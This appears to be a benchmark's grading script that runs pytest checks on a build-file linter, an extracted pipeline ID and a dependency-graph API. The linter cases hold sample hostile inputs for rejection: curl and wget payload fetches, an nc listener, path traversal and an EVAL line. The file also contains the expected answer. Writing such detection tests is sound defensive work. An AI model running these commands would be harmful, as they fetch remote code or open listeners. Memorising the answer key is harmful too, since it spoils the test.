#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import glob
import json
import os
import random
import secrets
import signal
import subprocess
import tempfile
import time
import urllib.request

import pytest


def test_pipeline_id_extracted():
    path = "/home/user/pipeline_id.txt"
    assert os.path.isfile(path), f"Missing pipeline_id.txt at {path}"
    with open(path, "r") as f:
        content = f.read().strip()
    assert content == "A8F93X7", f"Expected pipeline ID 'A8F93X7', but got '{content}'"


def run_linter(linter_path, path):
    return subprocess.run(
        ["bash", linter_path, path],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=5,
    ).returncode


def test_linter_script():
    linter_path = "/home/user/linter.sh"
    assert os.path.isfile(linter_path), f"Missing linter script at {linter_path}"
    assert os.access(linter_path, os.X_OK), f"Linter script {linter_path} is not executable"

    clean_dir = "/app/corpus/clean"
    evil_dir = "/app/corpus/evil"
    clean_files = [os.path.join(clean_dir, f) for f in os.listdir(clean_dir) if f.endswith(".build")]
    evil_files = [os.path.join(evil_dir, f) for f in os.listdir(evil_dir) if f.endswith(".build")]

    clean_failed = []
    for path in clean_files:
        if run_linter(linter_path, path) != 0:
            clean_failed.append(os.path.basename(path))

    evil_failed = []
    for path in evil_files:
        if run_linter(linter_path, path) != 1:
            evil_failed.append(os.path.basename(path))

    error_msgs = []
    if clean_failed:
        error_msgs.append(f"{len(clean_failed)} of {len(clean_files)} clean modified (rejected): {', '.join(clean_failed)}")
    if evil_failed:
        error_msgs.append(f"{len(evil_failed)} of {len(evil_files)} evil bypassed (accepted): {', '.join(evil_failed)}")
    assert not error_msgs, "Linter validation failed:\n" + "\n".join(error_msgs)

    # Mixed, unpredictably named files outside the shipped corpus prevent decisions
    # based only on the original directory or filenames.
    cases = [
        ("TARGET normal\nFLAGS -O2 -Iinclude\nCOMMAND gcc -c src.c\n", 0),
        ("TARGET linked\nDEPENDS normal\nFLAGS -target riscv64-linux-gnu\nCOMMAND clang main.c -o main\n", 0),
        ("TARGET fetch\nFLAGS -O2\nCOMMAND curl https://example.invalid/payload\n", 1),
        ("TARGET fetch2\nCOMMAND wget -q https://example.invalid/archive\nFLAGS -O2\n", 1),
        ("TARGET listener\nFLAGS -O0\nCOMMAND nc -l 9000\n", 1),
        ("TARGET absolute\nFLAGS -o /var/tmp/output\nCOMMAND gcc source.c\n", 1),
        ("TARGET traversal\nFLAGS -I ../../private/include\nCOMMAND gcc source.c\n", 1),
        ("TARGET expression\nFLAGS -O2\nEVAL echo unsafe\nCOMMAND gcc source.c\n", 1),
    ]
    random.SystemRandom().shuffle(cases)
    with tempfile.TemporaryDirectory(prefix="build-validation-") as temp_dir:
        failures = []
        for content, expected in cases:
            path = os.path.join(temp_dir, secrets.token_hex(10) + ".build")
            with open(path, "w") as f:
                f.write(content)
            actual = run_linter(linter_path, path)
            if actual != expected:
                failures.append(f"{os.path.basename(path)} expected {expected}, got {actual}")
        assert not failures, "Linter failed generated behavioral cases:\n" + "\n".join(failures)


def parse_corpus(directory):
    graph = {}
    for path in glob.glob(os.path.join(directory, "*.build")):
        target = None
        dependencies = []
        with open(path, "r") as f:
            for raw_line in f:
                parts = raw_line.strip().split(None, 1)
                if not parts:
                    continue
                key = parts[0]
                value = parts[1].strip() if len(parts) == 2 else ""
                if key == "TARGET":
                    target = value
                elif key == "DEPENDS":
                    dependencies = [item.strip() for item in value.split(",") if item.strip()]
        if target is not None:
            graph[target] = dependencies
    return graph


def stop_process(proc):
    try:
        os.killpg(proc.pid, signal.SIGTERM)
    except ProcessLookupError:
        pass
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
        proc.wait(timeout=5)


def fetch_graph(api_path):
    proc = subprocess.Popen(
        ["bash", api_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    response_data = None
    content_type = None
    try:
        for _ in range(20):
            try:
                req = urllib.request.Request("http://localhost:8080/dependencies")
                with urllib.request.urlopen(req, timeout=2) as response:
                    assert response.status == 200, f"Expected HTTP 200, got {response.status}"
                    content_type = response.headers.get("Content-Type", "")
                    response_data = response.read().decode("utf-8")
                    break
            except (AssertionError, urllib.error.HTTPError):
                raise
            except Exception:
                if proc.poll() is not None:
                    break
                time.sleep(0.25)
        if response_data is None:
            pytest.fail("Failed to connect to API server on port 8080")
    finally:
        stop_process(proc)

    assert content_type.lower().split(";", 1)[0].strip() == "application/json", \
        f"Expected application/json Content-Type, got {content_type!r}"
    try:
        return json.loads(response_data)
    except json.JSONDecodeError:
        pytest.fail(f"API response is not valid JSON: {response_data}")


def assert_graph_equal(actual, expected):
    try:
        actual_sets = {key: set(value) for key, value in actual.items()}
    except (AttributeError, TypeError) as exc:
        pytest.fail(f"Dependency graph has invalid structure: {actual!r} ({exc})")
    expected_sets = {key: set(value) for key, value in expected.items()}
    assert actual_sets == expected_sets, f"Dependency graph mismatch. Expected {expected}, got {actual}"


def write_generated_corpus(clean_dir, round_number):
    token = secrets.token_hex(5)
    targets = [f"target_{round_number}_{token}_{i}" for i in range(4)]
    definitions = [
        (targets[0], [targets[1], targets[2]]),
        (targets[1], []),
        (targets[2], [targets[1]]),
        (targets[3], [targets[0], targets[2], targets[1]]),
    ]
    random.SystemRandom().shuffle(definitions)
    for target, dependencies in definitions:
        path = os.path.join(clean_dir, secrets.token_hex(8) + ".build")
        with open(path, "w") as f:
            f.write(f"TARGET {target}\n")
            if dependencies:
                f.write("DEPENDS " + ",".join(dependencies) + "\n")
            f.write("FLAGS -O2\n")
            f.write(f"COMMAND gcc -c {target}.c\n")


def test_api_script():
    api_path = "/home/user/api.sh"
    assert os.path.isfile(api_path), f"Missing API script at {api_path}"
    assert os.access(api_path, os.X_OK), f"API script {api_path} is not executable"

    expected_graph = {
        "app": ["utils", "core"],
        "utils": [],
        "core": ["utils"],
    }
    graph = fetch_graph(api_path)
    assert_graph_equal(graph, expected_graph)

    clean_dir = "/app/corpus/clean"
    original_files = {}
    for path in glob.glob(os.path.join(clean_dir, "*.build")):
        with open(path, "rb") as f:
            original_files[os.path.basename(path)] = f.read()

    try:
        # Exercise parsing twice with unpredictable targets, dependencies, contents,
        # and filenames. Expected answers are independently derived from the files.
        for round_number in (1, 2):
            for path in glob.glob(os.path.join(clean_dir, "*.build")):
                os.remove(path)
            write_generated_corpus(clean_dir, round_number)
            dynamic_expected = parse_corpus(clean_dir)
            dynamic_actual = fetch_graph(api_path)
            assert_graph_equal(dynamic_actual, dynamic_expected)
    finally:
        for path in glob.glob(os.path.join(clean_dir, "*.build")):
            os.remove(path)
        for name, data in original_files.items():
            with open(os.path.join(clean_dir, name), "wb") as f:
                f.write(data)
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
